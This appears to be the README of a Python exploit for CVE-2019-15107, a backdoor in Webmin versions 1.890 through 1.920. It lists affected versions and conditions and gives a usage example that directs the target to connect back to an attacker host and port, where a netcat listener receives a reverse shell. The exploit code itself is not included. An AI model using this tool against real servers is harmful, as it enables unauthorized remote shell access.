# Webmin-CVE2019-15107

Exploits a backdoor in Webmin servers versions 1.890 through 1.920.

Version 1.890 is exploitable in the default install.
Later versions to 1.920 require the expired password changing feature to be enabled.

Usage: 

python cve201915107.py 'target_ip' 'target_port' 'lhost' 'lport'

Example:

python cve201915107.py 192.168.1.202 10000 192.168.1.100 4444


Remember you need netcat lintening on 'lport' to receive the shell.
